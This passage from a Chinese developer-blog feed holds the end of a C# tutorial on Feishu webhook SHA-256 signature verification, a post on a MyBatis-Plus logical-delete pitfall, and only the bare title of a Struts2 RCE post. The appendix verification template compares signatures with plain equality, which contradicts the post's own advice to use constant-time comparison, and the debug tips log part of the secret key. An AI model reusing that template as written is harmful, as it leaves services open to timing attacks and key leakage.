Success\n    Q4c --&gt; |正常| Success\n    \n    Fix1 --&gt; Retry[重新测试]\n    Fix2 --&gt; Retry\n    Fix3 --&gt; Retry\n    Fix4 --&gt; Retry\n    \n    Retry --&gt; Start\n    \n    style Check1 fill:#e3f2fd\n    style Check2 fill:#f3e5f5\n    style Check3 fill:#e8f5e9\n    style Check4 fill:#fff3e0\n    style Success fill:#c8e6c9\n    style Fix1 fill:#ffebee\n    style Fix2 fill:#ffebee\n    style Fix3 fill:#ffebee\n    style Fix4 fill:#ffebee\n</div><h3 id=\"排查技巧\">排查技巧</h3>\n<h4 id=\"技巧-1打印关键信息\">技巧 1：打印关键信息</h4>\n<pre><code class=\"language-csharp\">_logger.LogDebug(\"========== 签名验证调试信息 ==========\");\n_logger.LogDebug(\"Timestamp: {Timestamp}\", timestamp);\n_logger.LogDebug(\"Nonce: {Nonce}\", nonce);\n_logger.LogDebug(\"Encrypt Key 前 8 位: {KeyPrefix}\", \n    encryptKey.Substring(0, 8));\n_logger.LogDebug(\"Body 长度: {BodyLength}\", body.Length);\n_logger.LogDebug(\"Body 前 100 字符: {BodyPrefix}\", \n    body.Substring(0, Math.Min(100, body.Length)));\n_logger.LogDebug(\"签名字符串前 150 字符: {SignStringPrefix}\", \n    signString.Substring(0, Math.Min(150, signString.Length)));\n_logger.LogDebug(\"计算的签名: {ComputedSignature}\", computedSignature);\n_logger.LogDebug(\"期望的签名: {ExpectedSignature}\", headerSignature);\n_logger.LogDebug(\"========================================\");\n</code></pre>\n<h4 id=\"技巧-2使用在线工具验证\">技巧 2：使用在线工具验证</h4>\n<p>你可以创建一个简单的在线工具来验证签名计算：</p>\n<pre><code class=\"language-html\">&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;飞书签名验证工具&lt;/title&gt;\n    &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js\"&gt;&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;飞书签名验证工具&lt;/h1&gt;\n    \n    &lt;label&gt;Timestamp:&lt;/label&gt;\n    &lt;input type=\"text\" id=\"timestamp\" placeholder=\"1768550348\"&gt;&lt;br&gt;\n    \n    &lt;label&gt;Nonce:&lt;/label&gt;\n    &lt;input type=\"text\" id=\"nonce\" placeholder=\"149323894\"&gt;&lt;br&gt;\n    \n    &lt;label&gt;Encrypt Key:&lt;/label&gt;\n    &lt;input type=\"text\" id=\"encryptKey\" placeholder=\"32位密钥\"&gt;&lt;br&gt;\n    \n    &lt;label&gt;Body:&lt;/label&gt;\n    &lt;textarea id=\"body\" rows=\"5\" placeholder='{\"encrypt\":\"...\"}'&gt;&lt;/textarea&gt;&lt;br&gt;\n    \n    &lt;button onclick=\"calculate()\"&gt;计算签名&lt;/button&gt;\n    \n    &lt;h3&gt;结果：&lt;/h3&gt;\n    &lt;div id=\"result\"&gt;&lt;/div&gt;\n    \n    &lt;script&gt;\n    function calculate() {\n        const timestamp = document.getElementById('timestamp').value;\n        const nonce = document.getElementById('nonce').value;\n        const encryptKey = document.getElementById('encryptKey').value;\n        const body = document.getElementById('body').value;\n        \n        // 构建签名字符串\n        const signString = timestamp + nonce + encryptKey + body;\n        \n        // 计算 SHA-256\n        const hash = CryptoJS.SHA256(signString);\n        const signature = hash.toString(CryptoJS.enc.Hex).toLowerCase();\n        \n        // 显示结果\n        document.getElementById('result').innerHTML = `\n            &lt;p&gt;&lt;strong&gt;签名字符串前 100 字符：&lt;/strong&gt;&lt;br&gt;\n            ${signString.substring(0, 100)}...&lt;/p&gt;\n            &lt;p&gt;&lt;strong&gt;计算的签名：&lt;/strong&gt;&lt;br&gt;\n            &lt;code style=\"color: green; font-size: 14px;\"&gt;${signature}&lt;/code&gt;&lt;/p&gt;\n        `;\n    }\n    &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<h4 id=\"技巧-3单元测试\">技巧 3：单元测试</h4>\n<pre><code class=\"language-csharp\">[Fact]\npublic async Task ValidateSignature_WithCorrectData_ShouldReturnTrue()\n{\n    // Arrange\n    var timestamp = 1768550348L;\n    var nonce = \"149323894\";\n    var encryptKey = \"go4kwHmzAbCdEfGhIjKlMnOpQrStUvWx\";\n    var body = \"{\\\"encrypt\\\":\\\"Ul/tHTDEQkOlKZuqYTS7t...\\\"}\";\n    \n    // 手动计算期望的签名\n    var signString = $\"{timestamp}{nonce}{encryptKey}{body}\";\n    using var sha256 = SHA256.Create();\n    var hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(signString));\n    var expectedSignature = BitConverter.ToString(hashBytes).Replace(\"-\", \"\").ToLower();\n    \n    // Act\n    var result = await _validator.ValidateSignature(\n        timestamp, nonce, body, expectedSignature, encryptKey);\n    \n    // Assert\n    Assert.True(result);\n}\n</code></pre>\n<h3 id=\"排查速查表\">排查速查表</h3>\n<table>\n<thead>\n<tr>\n<th>错误现象</th>\n<th>可能原因</th>\n<th>解决方案</th>\n<th>优先级</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>签名不匹配</td>\n<td>使用了 HMAC-SHA256</td>\n<td>改用纯 SHA-256</td>\n<td>⭐⭐⭐</td>\n</tr>\n<tr>\n<td>签名不匹配</td>\n<td>签名字符串有换行符</td>\n<td>直接拼接，无分隔符</td>\n<td>⭐⭐⭐</td>\n</tr>\n<tr>\n<td>签名不匹配</td>\n<td>使用了 Verification Token</td>\n<td>改用 Encrypt Key</td>\n<td>⭐⭐⭐</td>\n</tr>\n<tr>\n<td>签名不匹配</td>\n<td>输出格式为 Base64</td>\n<td>改用小写十六进制</td>\n<td>⭐⭐⭐</td>\n</tr>\n<tr>\n<td>签名不匹配</td>\n<td>签名字符串缺少 Encrypt Key</td>\n<td>添加 Encrypt Key</td>\n<td>⭐⭐⭐</td>\n</tr>\n<tr>\n<td>时间戳无效</td>\n<td>服务器时间不同步</td>\n<td>同步服务器时间</td>\n<td>⭐⭐</td>\n</tr>\n<tr>\n<td>Nonce 重复</td>\n<td>Redis 缓存配置错误</td>\n<td>检查 Redis 连接</td>\n<td>⭐⭐</td>\n</tr>\n<tr>\n<td>解密成功但签名失败</td>\n<td>密钥配置混乱</td>\n<td>确认使用正确的密钥</td>\n<td>⭐⭐</td>\n</tr>\n</tbody>\n</table>\n<hr />\n<h2 id=\"总结与思考\">总结与思考</h2>\n<h3 id=\"核心要点回顾\">核心要点回顾</h3>\n<p>让我用一张图总结飞书签名验证的核心要点：</p>\n<div class=\"mermaid\">mindmap\n  root((飞书 Webhook&lt;br/&gt;签名验证核心要点))\n    1️⃣ 签名算法\n      ✅ SHA-256\n      ❌ HMAC-SHA256\n    2️⃣ 签名字符串\n      ✅ 直接拼接\n      timestamp + nonce + encryptKey + body\n      ❌ 使用换行符分隔\n    3️⃣ 使用的密钥\n      ✅ Encrypt Key\n      ❌ Verification Token\n    4️⃣ 输出格式\n      ✅ 小写十六进制\n      f2d909fb...\n      ❌ Base64 编码\n    5️⃣ 安全防护\n      ✅ Nonce 去重\n      ✅ 时间戳验证\n      ✅ 固定时间比较\n      ✅ 密钥安全存储\n</div><h3 id=\"对比其他平台\">对比其他平台</h3>\n<p>为了帮助你更好地理解，我整理了几个主流平台的签名验证对比：</p>\n<table>\n<thead>\n<tr>\n<th>平台</th>\n<th>签名算法</th>\n<th>密钥类型</th>\n<th>字符串格式</th>\n<th>输出格式</th>\n<th>分隔符</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>飞书</strong></td>\n<td>SHA-256</td>\n<td>Encrypt Key</td>\n<td>timestamp+nonce+key+body</td>\n<td>小写 Hex</td>\n<td>无</td>\n</tr>\n<tr>\n<td>微信</td>\n<td>SHA-1</td>\n<td>Token</td>\n<td>字典序排序后拼接</td>\n<td>小写 Hex</td>\n<td>无</td>\n</tr>\n<tr>\n<td>钉钉</td>\n<td>HMAC-SHA256</td>\n<td>App Secret</td>\n<td>timestamp+\\n+secret</td>\n<td>Base64</td>\n<td>\\n</td>\n</tr>\n<tr>\n<td>企业微信</td>\n<td>SHA-256</td>\n<td>Token</td>\n<td>字典序排序后拼接</td>\n<td>小写 Hex</td>\n<td>无</td>\n</tr>\n<tr>\n<td>Slack</td>\n<td>HMAC-SHA256</td>\n<td>Signing Secret</td>\n<td>version:timestamp:body</td>\n<td>Hex</td>\n<td>:</td>\n</tr>\n</tbody>\n</table>\n<p><strong>关键发现：</strong></p>\n<ul>\n<li>飞书和微信都用纯哈希（SHA），不用 HMAC</li>\n<li>钉钉和 Slack 用 HMAC-SHA256</li>\n<li>大部分平台输出十六进制，只有钉钉用 Base64</li>\n<li>飞书的特殊之处：签名字符串中包含密钥本身</li>\n</ul>\n<h3 id=\"排查经验总结\">排查经验总结</h3>\n<p>经过这次踩坑经历，我总结了几点经验：</p>\n<h4 id=\"-经验-1不要想当然\">💡 经验 1：不要想当然</h4>\n<blockquote>\n<p>\"我以为飞书应该和微信一样...\"<br />\n\"我觉得应该用换行符分隔...\"<br />\n\"我猜测应该用 Verification Token...\"</p>\n</blockquote>\n<p><strong>教训：</strong> 每个平台都有自己的实现方式，不要基于其他平台的经验做假设。<strong>仔细阅读官方文档</strong>是最重要的。</p>\n<h4 id=\"-经验-2日志是你最好的朋友\">💡 经验 2：日志是你最好的朋友</h4>\n<p>在调试签名验证问题时，详细的日志帮了我大忙：</p>\n<pre><code class=\"language-csharp\">// 好的日志示例\n_logger.LogDebug(\"签名字符串: {SignString}\", signString);\n_logger.LogDebug(\"计算的签名: {Computed}, 期望的签名: {Expected}\", \n    computed, expected);\n\n// 不好的日志示例\n_logger.LogError(\"签名验证失败\");  // 没有任何有用信息\n</code></pre>\n<h4 id=\"-经验-3安全性和可用性的平衡\">💡 经验 3：安全性和可用性的平衡</h4>\n<ul>\n<li><strong>开发环境</strong>：可以放宽限制，方便调试</li>\n<li><strong>测试环境</strong>：接近生产环境的配置</li>\n<li><strong>生产环境</strong>：严格的安全策略</li>\n</ul>\n<pre><code class=\"language-csharp\">var toleranceSeconds = _environment.IsProduction() ? 60 : 300;\n</code></pre>\n<h4 id=\"-经验-4写单元测试\">💡 经验 4：写单元测试</h4>\n<p>签名验证的逻辑相对独立，非常适合写单元测试：</p>\n<pre><code class=\"language-csharp\">[Theory]\n[InlineData(1768550348, \"149323894\", \"go4kwHmz...\", \"{...}\", \"f2d909fb...\")]\npublic async Task ValidateSignature_WithKnownData_ShouldMatch(\n    long timestamp, string nonce, string key, string body, string expected)\n{\n    var result = await _validator.ValidateSignature(\n        timestamp, nonce, body, expected, key);\n    Assert.True(result);\n}\n</code></pre>\n<h3 id=\"延伸思考\">延伸思考</h3>\n<h4 id=\"-为什么飞书不用-hmac-sha256\">🤔 为什么飞书不用 HMAC-SHA256？</h4>\n<p>HMAC-SHA256 是更标准的签名算法，为什么飞书选择了纯 SHA-256？</p>\n<p>我的猜测：</p>\n<ol>\n<li><strong>性能考虑</strong>：SHA-256 比 HMAC-SHA256 稍快</li>\n<li><strong>实现简单</strong>：不需要额外的 HMAC 库</li>\n<li><strong>历史原因</strong>：可能是早期设计的遗留</li>\n</ol>\n<p>但从安全角度看，HMAC-SHA256 会更好，因为它专门设计用于消息认证。</p>\n<h4 id=\"-为什么要把密钥放在签名字符串里\">🤔 为什么要把密钥放在签名字符串里？</h4>\n<p>这是飞书的一个特殊设计。通常的做法是：</p>\n<ul>\n<li><strong>HMAC 方式</strong>：密钥作为 HMAC 的密钥参数</li>\n<li><strong>飞书方式</strong>：密钥直接拼接到字符串中</li>\n</ul>\n<p>这种方式的优点：</p>\n<ul>\n<li>实现简单，不需要 HMAC 库</li>\n<li>密钥参与哈希计算，提供了一定的安全性</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>不如 HMAC 标准和安全</li>\n<li>容易被误解（很多人会忘记加密钥）</li>\n</ul>\n<h3 id=\"推-荐-资-源\">推 荐 资 源</h3>\n<p>如果你想深入学习，这里有一些推荐资源：</p>\n<h4 id=\"-官方文档\">📚 官方文档</h4>\n<ul>\n<li><a href=\"https://open.feishu.cn/document/server-docs/event-subscription-guide/overview\" rel=\"noopener nofollow\" target=\"_blank\">飞书开放平台 - 事件订阅</a></li>\n<li><a href=\"https://open.feishu.cn/document/event-subscription-guide/event-subscriptions/event-subscription-configure-/choose-a-subscription-mode/send-notifications-to-developers-server\" rel=\"noopener nofollow\" target=\"_blank\">飞书开放平台 - 签名验证</a></li>\n</ul>\n<h4 id=\"️-开源项目\">🛠️ 开源项目</h4>\n<ul>\n<li><a href=\"https://github.com/mudtools/MudFeishu\" rel=\"noopener nofollow\" target=\"_blank\">Mud.Feishu SDK Github</a></li>\n<li><a href=\"https://gitee.com/mudtools/MudFeishu\" rel=\"noopener nofollow\" target=\"_blank\">Mud.Feishu SDK Gitee</a></li>\n<li><a href=\"https://github.com/larksuite\" rel=\"noopener nofollow\" target=\"_blank\">飞书官方 SDK</a> - 多语言官方 SDK</li>\n</ul>\n<hr />\n<h2 id=\"写在最后\">写在最后</h2>\n<p>从最初的签名验证失败，到最终搞清楚所有细节，这个过程让我深刻体会到：</p>\n<blockquote>\n<p><strong>技术细节决定成败。</strong> 一个小小的算法差异、一个字符串格式的不同，都可能导致功能完全无法工作。</p>\n</blockquote>\n<p>希望这篇文章能帮助你：</p>\n<ul>\n<li>✅ 理解飞书 Webhook 签名验证的完整机制</li>\n<li>✅ 避免我踩过的坑</li>\n<li>✅ 快速定位和解决签名验证问题</li>\n<li>✅ 构建安全可靠的 Webhook 服务</li>\n</ul>\n<p>如果你在实现过程中遇到问题，欢迎在评论区留言讨论。如果这篇文章对你有帮助，也欢迎分享给更多需要的人。</p>\n<p><strong>祝你的飞书集成之旅一帆风顺！</strong> 🚀</p>\n<hr />\n<h2 id=\"附录快速参考\">附录：快速参考</h2>\n<h3 id=\"a-签名验证代码模板c\">A. 签名验证代码模板（C#）</h3>\n<pre><code class=\"language-csharp\">public async Task&lt;bool&gt; ValidateFeishuSignature(HttpRequest request)\n{\n    // 1. 提取请求头\n    var timestamp = long.Parse(request.Headers[\"X-Lark-Request-Timestamp\"]);\n    var nonce = request.Headers[\"X-Lark-Request-Nonce\"].ToString();\n    var signature = request.Headers[\"X-Lark-Signature\"].ToString();\n    \n    // 2. 读取请求体\n    request.EnableBuffering();\n    var body = await new StreamReader(request.Body).ReadToEndAsync();\n    request.Body.Position = 0;\n    \n    // 3. 构建签名字符串\n    var signString = $\"{timestamp}{nonce}{_encryptKey}{body}\";\n    \n    // 4. 计算 SHA-256\n    using var sha256 = SHA256.Create();\n    var hash = sha256.ComputeHash(Encoding.UTF8.GetBytes(signString));\n    var computed = BitConverter.ToString(hash).Replace(\"-\", \"\").ToLower();\n    \n    // 5. 比较签名\n    return computed == signature;\n}\n</code></pre>\n<h3 id=\"b-配置文件模板\">B. 配置文件模板</h3>\n<pre><code class=\"language-json\">{\n  \"FeishuWebhook\": {\n    \"VerificationToken\": \"从飞书后台获取\",\n    \"EncryptKey\": \"从飞书后台获取（32位）\",\n    \"RoutePrefix\": \"feishu/webhook\",\n    \"TimestampToleranceSeconds\": 60,\n    \"EnableRequestLogging\": true,\n    \"EnableBackgroundProcessing\": false\n  }\n}\n</code></pre>\n<h3 id=\"c-术语表\">C. 术语表</h3>\n<table>\n<thead>\n<tr>\n<th>术语</th>\n<th>英文</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>签名</td>\n<td>Signature</td>\n<td>用于验证数据完整性和来源的字符串</td>\n</tr>\n<tr>\n<td>哈希</td>\n<td>Hash</td>\n<td>将任意长度数据转换为固定长度的算法</td>\n</tr>\n<tr>\n<td>HMAC</td>\n<td>Hash-based Message Authentication Code</td>\n<td>基于哈希的消息认证码</td>\n</tr>\n<tr>\n<td>Nonce</td>\n<td>Number used once</td>\n<td>一次性随机数，用于防重放攻击</td>\n</tr>\n<tr>\n<td>时间戳</td>\n<td>Timestamp</td>\n<td>Unix 时间戳，表示请求发送时间</td>\n</tr>\n<tr>\n<td>重放攻击</td>\n<td>Replay Attack</td>\n<td>重复发送已截获的合法请求</td>\n</tr>\n<tr>\n<td>计时攻击</td>\n<td>Timing Attack</td>\n<td>通过测量操作时间来推断信息</td>\n</tr>\n</tbody>\n</table>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 16:45</span>&nbsp;\n<a href=\"https://www.cnblogs.com/mudtools\">玩泥巴的|mudtools.cn</a>&nbsp;\n阅读(<span id=\"post_view_count\">78</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Mybatis-Plus更新操作时的一个坑",
      "link": "https://www.cnblogs.com/Marktowin/p/19492834",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/Marktowin/p/19492834\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 16:37\">\n    <span>Mybatis-Plus更新操作时的一个坑</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p>在 MyBatis-Plus开启逻辑删除 的情况下，updateById更新逻辑删除字段时， “看起来执行了但实际上没有更新”的问题是一种较为常见但不易察觉的问题。</p>\n<h3>背景：</h3>\n<p>项目中使用mybatis-plus且已开启逻辑删除：</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 128, 128, 1);\">1</span> mybatis-<span style=\"color: rgba(0, 0, 0, 1);\">plus:\n</span><span style=\"color: rgba(0, 128, 128, 1);\">2</span>   global-<span style=\"color: rgba(0, 0, 0, 1);\">config:\n</span><span style=\"color: rgba(0, 128, 128, 1);\">3</span>     db-<span style=\"color: rgba(0, 0, 0, 1);\">config:\n</span><span style=\"color: rgba(0, 128, 128, 1);\">4</span>       logic-delete-<span style=\"color: rgba(0, 0, 0, 1);\">field: deleted\n</span><span style=\"color: rgba(0, 128, 128, 1);\">5</span>       logic-delete-value: 1\n<span style=\"color: rgba(0, 128, 128, 1);\">6</span>       logic-not-delete-value: 0\n<span style=\"color: rgba(0, 128, 128, 1);\">7</span>       update-strategy: not_empty   #更新策略只更新非空</pre>\n</div>\n<p>在代码中获取记录并更新逻辑删除字段：</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 128, 128, 1);\">1</span> useRecord record =<span style=\"color: rgba(0, 0, 0, 1);\"> RecordMapper.selectOne(...); \n</span><span style=\"color: rgba(0, 128, 128, 1);\">2</span> record.setDeleted(1<span style=\"color: rgba(0, 0, 0, 1);\">);\n</span><span style=\"color: rgba(0, 128, 128, 1);\">3 </span>RecordMapper.updateById(record);</pre>\n</div>\n<p>执行结果没有明显报错，也不会有异常日志，但实际没有更新逻辑删除字段。</p>\n<p>如果没有记录执行返回值进行判断，将导致逻辑删除失败问题被隐藏，为后续业务埋雷。</p>\n<h3>原因分析：</h3>\n<p>mybatis-plus使用逻辑删除背景下，使用updateById时，如下代码段：</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 128, 128, 1);\">1</span> record.setDeleted(1<span style=\"color: rgba(0, 0, 0, 1);\">);\n</span><span style=\"color: rgba(0, 128, 128, 1);\">2</span> RecordMapper.updateById(record);</pre>\n</div>\n<p>执行的sql语句是：</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 128, 128, 1);\">1</span> <span style=\"color: rgba(0, 0, 255, 1);\">UPDATE</span><span style=\"color: rgba(0, 0, 0, 1);\"> table_name \n</span><span style=\"color: rgba(0, 128, 128, 1);\">2</span> <span style=\"color: rgba(0, 0, 255, 1);\">SET</span> deleted <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span> \n<span style=\"color: rgba(0, 128, 128, 1);\">3</span> <span style=\"color: rgba(0, 0, 255, 1);\">WHERE</span> id <span style=\"color: rgba(128, 128, 128, 1);\">=</span><span style=\"color: rgba(0, 0, 0, 1);\"> ? \n</span><span style=\"color: rgba(0, 128, 128, 1);\">4</span>   <span style=\"color: rgba(128, 128, 128, 1);\">AND</span> deleted <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">0</span>;  <span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> ⚠️ MyBatis-Plus 自动添加的条件</span></pre>\n</div>\n<p>这条 SQL 在语法层面是合法的，但在 MyBatis-Plus 的设计语义中，逻辑删除并不被视为一次普通的 update 操作。</p>\n<p>MyBatis-Plus 将“删除”与“更新”在内部逻辑上进行了区分：<em>updateById 被设计为只能作用于“未被逻辑删除的数据”，而逻辑删除本身应通过 delete 系列方法触发。</em></p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 128, 128, 1);\">1</span> <span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 你期望生成的SQL（框架不会生成）</span>\n<span style=\"color: rgba(0, 128, 128, 1);\">2</span> <span style=\"color: rgba(0, 0, 255, 1);\">UPDATE</span> record <span style=\"color: rgba(0, 0, 255, 1);\">SET</span> deleted <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span> <span style=\"color: rgba(0, 0, 255, 1);\">WHERE</span> id <span style=\"color: rgba(128, 128, 128, 1);\">=</span> ? <span style=\"color: rgba(128, 128, 128, 1);\">AND</span> deleted <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n</span><span style=\"color: rgba(0, 128, 128, 1);\">3</span> \n<span style=\"color: rgba(0, 128, 128, 1);\">4</span> <span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> updateById实际生成的SQL（deleted字段被剔除）</span>\n<span style=\"color: rgba(0, 128, 128, 1);\">5</span> <span style=\"color: rgba(0, 0, 255, 1);\">UPDATE</span> record <span style=\"color: rgba(0, 0, 255, 1);\">SET</span> other_field<span style=\"color: rgba(128, 128, 128, 1);\">=</span>? <span style=\"color: rgba(0, 0, 255, 1);\">WHERE</span> id <span style=\"color: rgba(128, 128, 128, 1);\">=</span> ? <span style=\"color: rgba(128, 128, 128, 1);\">AND</span> deleted <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">0</span>;</pre>\n</div>\n<h3>Mybatis-Plus为什么要这样设计：</h3>\n<div class=\"paragraph\">MyBtis-Plus 遵循 <span>\"语义隔离\" 原则</span></div>\n<div class=\"table markdown-table\"><span class=\"table-title\"><span class=\"table-title\"><br /></span></span>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr><th align=\"left\">操作类型</th><th align=\"left\">框架方法</th><th align=\"left\">SQL语义</th><th align=\"left\">设计意图</th></tr>\n\n\n\n</thead>\n<tbody>\n<tr>\n<td align=\"left\"><span>业务更新</span></td>\n<td align=\"left\"><code class=\"segment-code-inline\">updateById()</code></td>\n<td align=\"left\">修改业务字段</td>\n<td align=\"left\">只改数据内容，不改数据状态</td>\n\n\n\n</tr>\n<tr>\n<td align=\"left\"><span>逻辑删除</span></td>\n<td align=\"left\"><code class=\"segment-code-inline\">deleteById()</code></td>\n<td align=\"left\"><code class=\"segment-code-inline\">UPDATE ... SET deleted=1</code></td>\n<td align=\"left\">标记数据为\"已删除\"状态</td>\n\n\n\n</tr>\n\n\n\n</tbody>\n\n\n\n</table>\n\n\n\n</div>\n\n\n\n</div>\n<div class=\"paragraph\"><span>关键机制：</span></div>\n<ol start=\"1\">\n<li>\n<div class=\"paragraph\">拦截器过滤：<code class=\"segment-code-inline\">LogicDeleteInterceptor</code> 会自动移除 SET 子句中的逻辑删除字段</div>\n\n\n\n</li>\n<li>\n<div class=\"paragraph\">条件追加：所有查询/更新操作都会自动追加 <code class=\"segment-code-inline\">AND deleted = 0</code></div>\n\n\n\n</li>\n<li>\n<div class=\"paragraph\">单向操作：逻辑删除被视为<span>不可逆操作（删除后不应通过业务代码恢复）</span></div>\n\n\n\n</li>\n\n\n\n</ol>\n<h3>如何正确处理：</h3>\n<ul>\n<li>使用 MyBatis-Plus 提供的 deleteById 进行逻辑删除</li>\n\n\n\n</ul>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 128, 128, 1);\">1</span> <span style=\"color: rgba(128, 128, 128, 1);\">//</span> 框架会自动生成：<span style=\"color: rgba(0, 0, 255, 1);\">UPDATE</span> <span style=\"color: rgba(255, 0, 255, 1);\">user</span> <span style=\"color: rgba(0, 0, 255, 1);\">SET</span> deleted<span style=\"color: rgba(128, 128, 128, 1);\">=</span><span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span> <span style=\"color: rgba(0, 0, 255, 1);\">WHERE</span> id<span style=\"color: rgba(128, 128, 128, 1);\">=</span>? <span style=\"color: rgba(128, 128, 128, 1);\">AND</span> deleted<span style=\"color: rgba(128, 128, 128, 1);\">=</span><span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">0</span>\n<span style=\"color: rgba(0, 128, 128, 1);\">2</span> recordMapper.deleteById(1L); </pre>\n</div>\n<p>　　在开启逻辑删除的前提下，deleteById 不会执行物理删除，而是由 MyBatis-Plus 自动生成逻辑删除 SQL，其语义与框架设计完全一致。</p>\n<ul>\n<li>用 LambdaUpdateWrapper 显式执行逻辑删除</li>\n</ul>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 128, 128, 1);\">1</span>  <span style=\"color: rgba(128, 128, 128, 1);\">//</span><span style=\"color: rgba(0, 0, 0, 1);\"> 手动指定SET子句，绕过字段过滤\n</span><span style=\"color: rgba(0, 128, 128, 1);\">2</span> LambdaUpdateWrapper<span style=\"color: rgba(128, 128, 128, 1);\">&lt;</span>Record<span style=\"color: rgba(128, 128, 128, 1);\">&gt;</span> wrapper <span style=\"color: rgba(128, 128, 128, 1);\">=</span> new LambdaUpdateWrapper<span style=\"color: rgba(128, 128, 128, 1);\">&lt;&gt;</span><span style=\"color: rgba(0, 0, 0, 1);\">();\n</span><span style=\"color: rgba(0, 128, 128, 1);\">3</span> wrapper.eq(Record::getId, 1L).<span style=\"color: rgba(0, 0, 255, 1);\">set</span>(Record::getDeleted, <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span>); <span style=\"color: rgba(128, 128, 128, 1);\">//</span><span style=\"color: rgba(0, 0, 0, 1);\"> 强制设置deleted字段\n</span><span style=\"color: rgba(0, 128, 128, 1);\">4</span> recordMapper.<span style=\"color: rgba(0, 0, 255, 1);\">update</span>(<span style=\"color: rgba(0, 0, 255, 1);\">null</span>, wrapper);</pre>\n</div>\n<p>　　如果业务上必须通过 update 的方式完成逻辑删除，可以使用 LambdaUpdateWrapper，自行控制 WHERE 条件，避免与 MyBatis-Plus 的自动逻辑删除条件产生冲突。此方式绕过了 updateById 的内置逻辑删除约束，应明确其用途，避免被误用为普通更新。</p>\n<ul>\n<li>自定义 SQL 明确逻辑删除语</li>\n</ul>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 128, 128, 1);\">1</span> <span style=\"color: rgba(0, 128, 0, 1);\">@Update</span>(\"<span style=\"color: rgba(0, 0, 255, 1);\">UPDATE</span> record <span style=\"color: rgba(0, 0, 255, 1);\">SET</span> deleted <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span> <span style=\"color: rgba(0, 0, 255, 1);\">WHERE</span> id <span style=\"color: rgba(128, 128, 128, 1);\">=</span> #{id} <span style=\"color: rgba(128, 128, 128, 1);\">AND</span> deleted <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">\")\n</span><span style=\"color: rgba(0, 128, 128, 1);\">2</span> <span style=\"color: rgba(0, 0, 255, 1);\">int</span> logicDeleteById(<span style=\"color: rgba(0, 0, 255, 1);\">Long</span> id);</pre>\n</div>\n<p>　　适合对逻辑删除行为有强语义要求的项目，便于代码阅读和后期维护。</p>\n<p>&nbsp;</p>\n<h3>总结：</h3>\n<p>在 MyBatis-Plus 中，逻辑删除不是一次普通的字段更新操作。updateById 被设计为只能更新“未被逻辑删除的数据”，而不用于触发逻辑删除本身。当更新语句同时在 SET 和 WHERE 中涉及逻辑删除字段时，就会与框架的设计语义产生冲突。正确的做法是使用 delete 系列方法，或通过 Wrapper / 自定义 SQL 明确表达“逻辑删除”的意图。</p>\n<p>&nbsp;</p>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 16:37</span>&nbsp;\n<a href=\"https://www.cnblogs.com/Marktowin\">Marktowin</a>&nbsp;\n阅读(<span id=\"post_view_count\">82</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Apache Struts2 OGNL RCE注入",
      "link": "https://www.cnblogs.com/hzhsec/p/19492577",
      "published": "",
